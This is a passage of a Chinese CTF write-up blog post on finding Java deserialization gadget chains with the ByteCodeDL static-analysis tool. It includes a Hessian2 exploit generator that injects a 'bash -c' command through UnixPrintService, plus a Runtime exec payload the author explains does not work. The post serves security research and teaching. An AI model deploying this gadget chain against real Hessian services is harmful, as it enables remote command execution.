Hessian2Output(outputStream);</span><br><span class="line">        SerializerFactory sf = <span class="keyword">new</span> NoWriteReplaceSerializerFactory();</span><br><span class="line">        sf.setAllowNonSerializable(<span class="keyword">true</span>);</span><br><span class="line">        out.setSerializerFactory(sf);</span><br><span class="line"></span><br><span class="line">        Field theUnsafe = Unsafe.class.getDeclaredField("theUnsafe");</span><br><span class="line">        theUnsafe.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Unsafe unsafe = (Unsafe) theUnsafe.get(<span class="keyword">null</span>);</span><br><span class="line">        Object unix = unsafe.allocateInstance(UnixPrintService<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        setFieldValue(unix, <span class="string">"printer"</span>, String.format(<span class="string">";bash -c '%s';"</span>, cmd));</span><br><span class="line">        setFieldValue(unix, <span class="string">"lpcStatusCom"</span>, <span class="keyword">new</span> String[]&#123;<span class="string">"ls"</span>, <span class="string">"ls"</span>, <span class="string">"ls"</span>&#125;);</span><br><span class="line">        ToStringBean toStringBean = <span class="keyword">new</span> ToStringBean(Class.forName(<span class="string">"sun.print.UnixPrintService"</span>), unix);</span><br><span class="line">        EqualsBean hashCodeTrigger = <span class="keyword">new</span> EqualsBean(ToStringBean<span class="class">.<span class="keyword">class</span>, <span class="title">toStringBean</span>)</span>;</span><br><span class="line"></span><br><span class="line">        out.writeMapBegin(<span class="string">"java.util.HashMap"</span>);</span><br><span class="line">        out.writeObject(hashCodeTrigger);</span><br><span class="line">        out.writeObject(<span class="string">"value"</span>);</span><br><span class="line">        out.writeMapEnd();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String field, Object value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Class clazz = obj.getClass();</span><br><span class="line">            Field fld = clazz.getDeclaredField(field);</span><br><span class="line">            fld.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            fld.set(obj, value);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">NoWriteReplaceSerializerFactory</span> <span class="keyword">extends</span> <span class="title">SerializerFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.caucho.hessian.io.SerializerFactory#getObjectSerializer(java.lang.Class)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Serializer <span class="title">getObjectSerializer</span> <span class="params">(Class&lt;?&gt; cl )</span> <span class="keyword">throws</span> HessianProtocolException </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.getObjectSerializer(cl);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.caucho.hessian.io.SerializerFactory#getSerializer(java.lang.Class)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Serializer <span class="title">getSerializer</span> <span class="params">( Class cl )</span> <span class="keyword">throws</span> HessianProtocolException </span>&#123;</span><br><span class="line">            Serializer serializer = <span class="keyword">super</span>.getSerializer(cl);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( serializer <span class="keyword">instanceof</span> WriteReplaceSerializer) &#123;</span><br><span class="line">                <span class="keyword">return</span> UnsafeSerializer.create(cl);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> serializer;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后再通过命令盲注的方式，或者attach agent的方式获取flag。</p>
+<p>赛后和选手交流的时候，Y4tacker问我下面payload 行不行？</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Runtime runtime = Runtime.getRuntime();</span><br><span class="line">Expression expression = <span class="keyword">new</span> Expression(runtime, <span class="string">"exec"</span>, <span class="keyword">new</span> Object[]&#123;<span class="string">"open -na Calculator"</span>&#125;);</span><br><span class="line">expression.getValue();</span><br></pre></td></tr></table></figure>
+<p>通过调试发现最终确实能够调用到getVaue，但是getValue中，unbound是个static变量，反序列化时不可控，无法让value和unbound相等，我尝试用reference，发现只能reference已经反序列化好的对象。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public Object getValue() throws Exception &#123;</span><br><span class="line">    if (value == unbound) &#123;</span><br><span class="line">    		setValue(invoke());</span><br><span class="line">    &#125;</span><br><span class="line">    return value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>所以getValue这个getter不能用在这里。</p>
+<p>最后也发现一些问题，长度设置为6，在76880 nodes 1119478 relationships 的情况下就查不来了，不知道建立索引会不会好一点。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCH p=(e:entry)-[*6]-&gt;(s:sink) where s.method contains &quot;exec&quot;  RETURN p</span><br></pre></td></tr></table></figure>
+<p>对于如何提升ByteCodeDL的效率和精度后面再介绍。</p>
+<p>CHA的优点一是快，二是不存在漏报，但是这也是他的缺点，存在大量的误报，实际测试下来发现需要排除的东西还挺多，仍有不少工作量，还有很大的提升空间。后面将尝试利用污点分析对该任务的精度进行提升。</p>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ul>
+<li><a href="https://blog.zsxsoft.com/post/35" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/35</a></li>
+<li><a href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html" target="_blank" rel="noopener">http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html</a></li>
+<li><a href="https://github.com/BytecodeDL/ByteCodeDL" target="_blank" rel="noopener">https://github.com/BytecodeDL/ByteCodeDL</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/java/" rel="tag"># java</a>
+            
+              <a href="/tags/deserialization/" rel="tag"># deserialization</a>
+            
+              <a href="/tags/bytecodedl/" rel="tag"># bytecodedl</a>
+            
+              <a href="/tags/static-analysis/" rel="tag"># static-analysis</a>
+            
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+            
+              <a href="/tags/gadget/" rel="tag"># gadget</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2022/05/03/how-to-host-blog-by-hexo/" rel="next" title="博客搭建过程">
+                  <i class="fa fa-chevron-left"></i> 博客搭建过程
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2022/05/06/bytecodedl-ptaint-implement/" rel="prev" title="ByteCodeDL原理篇之手把手教你实现污点分析">
+                  ByteCodeDL原理篇之手把手教你实现污点分析 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#buggyLoader-0ctf-2021-final"><span class="nav-number">1.</span> <span class="nav-text">buggyLoader 0ctf-2021-final</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezchain-hfctf2022"><span class="nav-number">2.</span> <span class="nav-text">ezchain hfctf2022</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reference"><span class="nav-number">3.</span> <span class="nav-text">reference</span></a></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">yxxx</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives">
+        
+          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">tags</span>
+        </a>
+      </div>
+    
+  </nav>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yxxx</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.0</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+
+
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
